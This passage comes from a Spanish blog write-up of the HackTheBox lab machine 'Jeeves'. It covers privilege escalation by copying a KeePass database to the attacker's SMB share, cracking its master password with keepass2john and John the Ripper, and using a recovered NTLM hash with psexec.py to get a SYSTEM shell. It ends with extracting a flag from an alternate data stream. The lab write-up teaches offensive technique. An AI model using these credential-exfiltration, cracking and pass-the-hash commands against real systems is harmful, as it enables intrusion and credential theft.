+<h1 id="escalada-de-privilegios">Escalada de privilegios <a href="#escalada-de-privilegios">#</a></h1>
+
+<p>Enumerando las carpetas de <code>kohsuke</code> encontramos una base de datos de contraseñas en <code>Documents</code>:</p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/jeeves/114bash_kohsukeSH_dirDocuments.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;" /></p>
+
+<p>Por si no conoces los archivos <strong>.kdbx</strong>:</p>
+
+<p>🔐 <strong><em>Un objeto con la extensión <code>.kdbx</code> es un archivo <u>KeePass Password Database</u>, la finalidad de estos archivos es almacenar y proteger un grupo de contraseñas de manera segura. Para acceder a la base de datos se necesita una contraseña -madre- o -maestra- que es la encargada de securizar toooooodas las demás contraseñas.</em></strong></p>
+
+<p>Más info <strong>KeePass</strong> y <strong>.kdbx</strong>:</p>
+
+<ul>
+  <li><a href="https://es.wikipedia.org/wiki/KeePass">KeePass</a>.</li>
+  <li><a href="https://filext.com/file-extension/KDBX">Opening KDBX Files</a>.</li>
+</ul>
+
+<p>…</p>
+
+<h2 id="keepass2john">Jugamos con el archivo <u>.kdbx</u> y obtenemos <u>master password</u> <a href="#keepass2john">📌</a></h2>
+
+<p>Existe una herramienta llamada <a href="http://kpcli.sourceforge.net/">kpcli</a> con la cual podemos jugar para interactuar con la base de datos, pero primero pasémonos el archivo a nuestro sistema:</p>
+
+<pre><code class="language-powershell">c:\\Users\kohsuke\Documents&gt;copy CEH.kdbx \\10.10.14.2\smbFolder\CEH.kdbx
+</code></pre>
+
+<pre><code class="language-bash">❱ file CEH.kdbx 
+CEH.kdbx: Keepass password database 2.x KDBX
+</code></pre>
+
+<p>Esta este excelente tutorial del que nos guiaremos para leer la base de datos:</p>
+
+<ul>
+  <li><a href="https://www.digitalocean.com/community/tutorials/how-to-use-kpcli-to-manage-keepass2-password-files-on-an-ubuntu-14-04-server">How To Use kpcli To Manage KeePass2 Password Files</a>.</li>
+</ul>
+
+<p>Ejecutamos la herramienta y le indicamos que vamos a usar el archivo <code>.kdbx</code>:</p>
+
+<pre><code class="language-bash">❱ kpcli 
+</code></pre>
+
+<pre><code class="language-bash">kpcli:/&gt; open CEH.kdbx 
+Please provide the master password:
+</code></pre>
+
+<p>Jmmmm, lo que habíamos dicho antes, por lo general es necesaria una password maestra… Al colocar cualquier cosa obtenemos:</p>
+
+<blockquote>
+  <p><span style="color: yellow;">Couldn’t load the file CEH.kdbx: The database key appears invalid or else the database is corrupt.</span></p>
+</blockquote>
+
+<p>F, F, F…</p>
+
+<p>Dando algunas vueltas encontramos este recurso:</p>
+
+<ul>
+  <li><a href="https://tzusec.com/tag/keepass2john/">Cracking KeePass Database</a>.</li>
+</ul>
+
+<p>En él se usa la herramienta <code>keepass2john</code> la cual obtiene un hash que hace referencia a la <strong>master password</strong>, depende de que tan fuerte sea para evitar ser crackeada (:</p>
+
+<p>Asíííííí que obtengamos el hash e intentemos crackearlo:</p>
+
+<pre><code class="language-bash">❱ keepass2john CEH.kdbx
+CEH:$keepass$*2*6000*0*1af405cc00f979ddb9bb387c4594fcea2fd01a6a0757c000e1873f3c71941d3d*3869fe357ff2d7db1555cc668d1d606b1dfaf02b9dba2621cbe9ecb63c7a4091*393c97beafd8a820db9142a6a94f03f6*b73766b61e656351c3aca0282f1617511031f0156089b6c5647de4671972fcff*cb409dbc0fa660fcffa4f1cc89f728b68254db431a21ec33298b612fe647db48
+</code></pre>
+
+<p>Peeerfecto, guardémoslo en un archivo:</p>
+
+<pre><code class="language-bash">❱ keepass2john CEH.kdbx &gt; CEH.txt
+</code></pre>
+
+<p>Y ahora simplemente se lo pasamos a <code>John The Ripper</code> (que es un <strong>crack</strong>eador de contraseñas):</p>
+
+<pre><code class="language-bash">❱ john --wordlist=/usr/share/wordlists/rockyou.txt CEH.txt 
+Using default input encoding: UTF-8
+Loaded 1 password hash (KeePass [SHA256 AES 32/64])
+Cost 1 (iteration count) is 6000 for all loaded hashes
+Cost 2 (version) is 2 for all loaded hashes
+Cost 3 (algorithm [0=AES, 1=TwoFish, 2=ChaCha]) is 0 for all loaded hashes
+Press 'q' or Ctrl-C to abort, almost any other key for status
+moonshine1       (CEH)
+1g 0:00:01:09 DONE (2021-08-17 19:32) 0.01443g/s 793.5p/s 793.5c/s 793.5C/s moonshine1
+Use the "--show" option to display all of the cracked passwords reliably
+Session completed
+</code></pre>
+
+<p>¿KHE ZE BE POR AY? Tenemos la <strong><em>master password</em></strong> en texto planooooooooooooooooo.</p>
+
+<p>Pos volvamos a cargar la base de datos y le pasamos esa pw:</p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/jeeves/114bash_kpcli_openDB_done.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;" /></p>
+
+<p>Ahora síííííííí, pos retomemos el <a href="https://www.digitalocean.com/community/tutorials/how-to-use-kpcli-to-manage-keepass2-password-files-on-an-ubuntu-14-04-server">tutorial de antes</a> y exploremos…</p>
+
+<hr />
+
+<h2 id="keepass-cracked">Vemos credenciales del gestor <u>KeePass</u> <a href="#keepass-cracked">📌</a></h2>
+
+<p>Como bien dice el post, la interacción es muy parecida a la de los comandos <code>*nix</code>, pero claramente no opera sobre el sistema sino sobre la estructura que tiene la base de datos:</p>
+
+<pre><code class="language-bash">kpcli:/&gt; ls
+=== Groups ===
+CEH/
+</code></pre>
+
+<p>Existe un grupo (que sería un apartado para organizar las distintas contraseñas), entremos en él:</p>
+
+<pre><code class="language-bash">kpcli:/&gt; cd CEH/
+kpcli:/CEH&gt; ls
+=== Groups ===
+eMail/
+General/
+Homebanking/
+Internet/
+Network/
+Windows/
+=== Entries ===
+0. Backup stuff                                                           
+1. Bank of America                                   www.bankofamerica.com
+2. DC Recovery PW                                                         
+3. EC-Council                               www.eccouncil.org/programs/cer
+4. It's a secret                                 localhost:8180/secret.jsp
+5. Jenkins admin                                            localhost:8080
+6. Keys to the kingdom                                                    
+7. Walmart.com                                             www.walmart.com
+</code></pre>
+
+<p>Vemos también algunos grupos, pero lo nuevo son las -entradas-, que serian las contraseñas que hay guardadas.</p>
+
+<p>Tenemos la descripción del usuario y el sitio al que pertenece esa credencial (hay dos bastante curiosas que hacen referencia a servicios locales (pero que no existen en el sistema :P)), por ejemplo si inspeccionamos la password del <strong>banco de america</strong> tendríamos esta estructura:</p>
+
+<blockquote>
+  <p>Podemos ya sea llamar el index de cada uno (0,1,2,3…) o su nombre (Bank of America, EC-Council…)</p>
+</blockquote>
+
+<hr />
+
+<pre><code class="language-bash">kpcli:/CEH&gt; show 1
+</code></pre>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/jeeves/114bash_kpcli_show1.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;" /></p>
+
+<p>La barra roja evita mostrar la contraseña a los ojitos, pero si copiamos el contenido y lo pegamos en cualquier otro sitio, vamos a ver la contraseña.</p>
+
+<p>Después de jugar con todas las entradas obtenemos:</p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/jeeves/114bash_kpcli_showALL.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;" /></p>
+
+<hr />
+
+<h2 id="psexec">Obtenemos terminal usando <u>hashes</u> y <u>psexec.py</u> <a href="#psexec">📌</a></h2>
+
+<p>Hay algunas contraseñas mooooooy llamativas, pero lo que más me llamo la atención fue la contraseña del index <code>0</code>, me recordó a cuando se dumpea la <a href="https://en.wikipedia.org/wiki/Security_Account_Manager">SAM</a> (archivo que contiene las contraseñas de los usuarios del sistema), ya que tienen el mismo formato, adjunto prueba e.e</p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/jeeves/114google_dumpSAM.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;" /></p>
+
+<blockquote>
+  <p>Tomada de <a href="https://subscription.packtpub.com/book/networking-and-servers/9781788623179/5/ch05lvl1sec76/dumping-the-contents-of-the-sam-database">packtpub - dumping-the-contents-of-the-sam-database</a>.</p>
+</blockquote>
+
+<p>Si nos fijamos es igualito, si a nuestra credencial le agregamos al inicio un nombre de usuario queda igual, así que pueda que tengamos un hash de la <strong>SAM</strong>.</p>
+
+<p>Lo bueno de tener esto es que podemos usarlas como -contraseñas- (:</p>
+
+<p>Usemos <code>psexec</code> (herramienta para acceder remotamente a un host) para probar el ingreso con los hashes:</p>
+
+<pre><code class="language-bash">❱ psexec.py Jeeves/Administrator@10.10.10.63 -hashes aad3b435b51404eeaad3b435b51404ee:e0fb1fb85756c24235ff238cbe81fe00
+</code></pre>
+
+<p>Le pasamos el hostname (<code>Jeeves</code>), el usuario (inicialmente probamos con <code>Administrator</code>) el host y finalmente los hashes, ejecutamos yyyyyyyyy:</p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/jeeves/114bash_psexec_NTauthoritySYSTEM_SH_done.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;" /></p>
+
+<p>LKAÑÑÑÑÑsdfñlñÑsjdflkasjdflkajsoiJAODIafjsid VAMOOOOOOOOOOO!! Tamos en el sistema como el usuario <code>nt authority\system</code>.</p>
+
+<hr />
+
+<h1 id="ads">Extraemos la flag <u>root.txt</u> de un <u>ADS</u> <a href="#ads">📌</a></h1>
+
+<p>Veamos las flags:</p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/jeeves/114bash_NTsysSH_dirAdministratorDesktop.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;" /></p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/jeeves/114bash_NTsysSH_type_hmTXT.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;" /></p>
+
+<p>Pos no, aún no vamos a ver flags ¯\<em>(ツ)</em>/¯, tenemos que buscar el objeto <code>root.txt</code>…</p>
+
+<p>Nos indica que -veamos profundamente-, jmmm.</p>
+
+<p>Lo primero que se ocurrió fue que podría estar oculto en alguna ruta del sistema pero neeeeeeelson:</p>
+
+<pre><code class="language-powershell">c:\&gt;powershell -c Get-ChildItem -Path C:\ -Filter root.txt -Recurse -ErrorAction SilentlyContinue -Force
+</code></pre>
+
+<p>Lo siguiente que iba a hacer era complicarme con ese <code>.lnk</code> extraño del directorio <code>Desktop</code>, peeeeeeeeero al momento pensé en intentar buscar archivos ocultos pero dentro de los mismos archivos existentes :o lo también llamado <code>Alternate Data Stream</code>, que seria ocultar información dentro de archivos.</p>
+
+<p>Les dejo un artículo que hice en su tiempo profundizando a tope en los <strong>ADS</strong>:</p>
+
+<ul>
+  <li><a href="https://lanzt.github.io/article/ads-windows">Ocultando data en archivos de Windows (con ADS)</a>.</li>
+</ul>
+
+<p>Podemos probar inicialmente con <code>dir /r</code>:</p>
+
+<p>👁️‍🗨️ <strong><em>Display alternate data streams of the file.</em></strong> <a href="https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/dir">docs.microsoft</a>.</p>
+
+<p>A veeeeeeeeeer:</p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/jeeves/114bash_NTsysSH_dirR_ADSfound.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;" /></p>
+
+<p>OJOOOOO, existe un archivo oculto dentro de <code>hm.txt</code> llamado <code>root.txt</code>, o sea, la flag (: pues veamos su contenido:</p>
+
+<p>Usaremos el comando <code>more</code> para revelar el contenido del <strong>ADS</strong>, de manera normal:</p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/jeeves/114bash_NTsysSH_moreNormal.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;" /></p>
+
+<p>Y ahora referenciando el <strong>ADS</strong>:</p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/jeeves/114flags.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;" /></p>
+
+<p>Ya tendríamos las flags de la máquina (:</p>
+
+<p>Y finaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaal :^D</p>
+
+<p>…</p>
+
+<p>Bonita máquina, primer acercamiento contra un servidor <strong>Jenkins</strong> y todas sus locuras. El tema de <strong>KeePass</strong> me gusto bastante también. El <strong>ADS</strong> no me exploto la cabeza porque ya los conocía, pero son muy lindos jajaj.</p>
+
+<p>Meno, nos leeremos otro día, que estés bien y como siempre, a seguir rompiendo de tooooooooooooodo!!</p>
+
+</div>
+
+<!-- Rating -->
+
+
+<!-- Author Box if enabled from _config.yml -->
+<!-- Author Box -->
+
+
+
+
+<!-- Comments if not disabled with comments: false -->
+<!-- Comments
+================================================== -->
+ 
+<div class="comments">
+    <button class="btn btn-dark show-comments">Comentarios</button>         
+    <div id="comments">  
+        <h4 class="mb-4">Comments</h4>                 
+            <section class="disqus">
+    <div id="disqus_thread"></div>
+    <script type="text/javascript">
+        var disqus_shortname = 'demowebsite'; 
+        var disqus_developer = 0;
+        (function() {
+            var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
+            dsq.src = window.location.protocol + '//' + disqus_shortname + '.disqus.com/embed.js';
+            (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+        })();
+    </script>
+    <noscript>Please enable JavaScript to view the <a href="http://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+    <a href="http://disqus.com" class="dsq-brlink">comments powered by <span class="logo-disqus">Disqus</span></a>
+</section>
+     
+    <div class="clearfix"></div>              
+    </div>    
+</div>       
+
+
+<!-- Share -->
+<div class="share">
+    <p>
+        Vacios
+    </p>
+    <ul>
+        <li class="ml-1 mr-1">
+            <a target="_blank" href="https://twitter.com/intent/tweet?text=HackTheBox - Jeeves&url=http://localhost:4000/htb/jeeves" onclick="window.open(this.href, 'twitter-share', 'width=550,height=235');return false;">
+                <i class="fab fa-twitter"></i>
+            </a>
+        </li>
+
+        <li class="ml-1 mr-1">
+            <a target="_blank" href="https://www.hackthebox.eu/profile/73707" onclick="window.open(this.href, 'width=550,height=435');return false;">
+                <i class="fas fa-cube"></i>
+            </a>
+        </li>
+
+        <li class="ml-1 mr-1">
+            <a target="_blank" href="https://github.com/lanzt" onclick="window.open(this.href, 'width=550,height=435');return false;">
+                <i class="fab fa-github"></i>
+            </a>
+        </li>
+
+    </ul>
+</div>
+
+
+<!-- Related Post -->
+<!-- Related Posts
+================================================== -->
+<div class=" related-posts ">  
+
+    
+    <h2 class="text-center mb-4">Posts relacionados a este (o se hace el intento).</h2>
+    
+    
+    <div class="d-flex justify-content-center align-items-center">
+
+    <!-- Tags -->  
+    
+                    
+    <a class="smoothscroll badge badge-primary" href="/tags#.kdbx">.kdbx</a>               
+                    
+    <a class="smoothscroll badge badge-primary" href="/tags#ADS">ADS</a>               
+                    
+    <a class="smoothscroll badge badge-primary" href="/tags#askjeeves">askjeeves</a>               
+                    
+    <a class="smoothscroll badge badge-primary" href="/tags#groovy">groovy</a>               
+                    
+    <a class="smoothscroll badge badge-primary" href="/tags#jenkins">jenkins</a>               
+                    
+    <a class="smoothscroll badge badge-primary" href="/tags#kpcli">kpcli</a>               
+    
+    
+    <!-- Categories -->
+    
+    
+    <a class="smoothscroll badge badge-primary" href="/categories#htb">htb</a>                
+    
+
+    </div>
+
+    
+    
+    
+    <div class="blog-grid-container">
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+            <!-- begin post -->
+
+
+<div class="blog-grid-item">
+    <div class="card h-100">
+        <div class="maxthumb">
+            <a href="/article/ads-windows">
+                
+
+                    
+                        <img class="img-thumb" src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/articles/ADS-Windows/ads_banner.png" alt="Ocultando data en archivos de Windows (con ADS)"> 
+                    
+
+                
+            </a>
+        </div>
+        <div class="card-body">
+            <h2 class="card-title">
+                <a class="text-dark" href="/article/ads-windows">Ocultando data en archivos de Windows (con ADS)</a>
+                
+            </h2>
+            <h4 class="card-text">Jugaremos con Alternate Data Stream o flujos de datos alternativos, veremos como un atacante (o víctima) puede ocultar información dentro de archivos ya sea para asegurarlos o para hacer locuras....</h4>
+        </div>
+        <div class="card-footer bg-white">
+            <div class="wrapfooter">
+                
+                <span class="meta-footer-thumb">
+                
+                <img class="author-thumb" src="https://www.gravatar.com/avatar/e56154546cf4be74e393c62d1ae9f9d4?s=250&d=mm&r=x" alt="Sh0x">
+                
+                </span>
+                <span class="author-meta">
+                <span class="post-name"><a target="_blank" href="">Sh0x</a></span> 
+                
+                <span class="post-date">15 Jun 2021</span>
+                </span>
+                <div class="clearfix"></div>
+            </div>
+        </div>
+    </div>
+</div>
+<!-- end post -->
+            
+            
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+            <!-- begin post -->
+
+
+<div class="blog-grid-item">
+    <div class="card h-100">
+        <div class="maxthumb">
+            <a href="/htb/dropzone">
+                
+
+                    
+                        <img class="img-thumb" src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/dropzone/139banner.png" alt="HackTheBox - Dropzone"> 
+                    
+
+                
+            </a>
+        </div>
+        <div class="card-body">
+            <h2 class="card-title">
+                <a class="text-dark" href="/htb/dropzone">HackTheBox - Dropzone</a>
+                
+            </h2>
+            <h4 class="card-text">Máquina Windows nivel difícil, bastante bastante entretenida, jugaremos con un servicio TFTP para escribir archivos arbitrariamente en el sistema (sin restricción), usaremos esa habilidad para jugar con objetos .mof y...</h4>
+        </div>
+        <div class="card-footer bg-white">
+            <div class="wrapfooter">
+                
+                <span class="meta-footer-thumb">
+                
+                <img class="author-thumb" src="https://www.gravatar.com/avatar/e56154546cf4be74e393c62d1ae9f9d4?s=250&d=mm&r=x" alt="Sh0x">
+                
+                </span>
+                <span class="author-meta">
+                <span class="post-name"><a target="_blank" href="">Sh0x</a></span> 
+                
+                <span class="post-date">01 Jun 2021</span>
+                </span>
+                <div class="clearfix"></div>
+            </div>
+        </div>
+    </div>
+</div>
+<!-- end post -->
+            
+            
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        </div>        
+</div>
+
+<!-- Review with LD-JSON, adapt it for your needs if you like, but make sure you test the generated HTML source code first: 
+https://search.google.com/structured-data/testing-tool/u/0/
+================================================== -->
+
+    </div>
+
+    
+    <!-- Newsletter
+    ================================================== -->
+    <div class="newsletter text-center">
+        <span class="h4"><img src="/assets/images/sh0x.png" class="newsletter-logo" alt="Sh0x blog"></span>
+        <p></p>
+    </div>
+    
+    
+</div>
+
+<!-- Begin Footer
+================================================== -->
+<footer class="footer">
+    <div class="container">
+        <div class="row">
+            <div class="col-md-6 col-sm-12 text-center text-lg-left">
+                Copyright © 2022 Sh0x blog 
+            </div>
+            <div class="col-md-6 col-sm-12 text-center text-lg-right">    
+                <a target="_blank" href="https://www.wowthemes.net/memoirs-free-jekyll-theme/">Memoirs Jekyll Theme</a> by WowThemes.net
+            </div>
+        </div>
+    </div>
+</footer>
+<!-- End Footer
+================================================== -->
+
+</div> <!-- /.site-content -->
+
+<!-- Scripts (if you need bootstrap.js, please add it yourself. I didn't use it for performance reasons, it was not needed in this theme)
+================================================== -->
+
+<script src="/assets/js/prism.js"></script>
+
+<script src="/assets/js/theme.js"></script>
+
+
+
+
+<script id="dsq-count-scr" src="//demowebsite.disqus.com/count.js"></script>
+
+
+</body>
+</html>
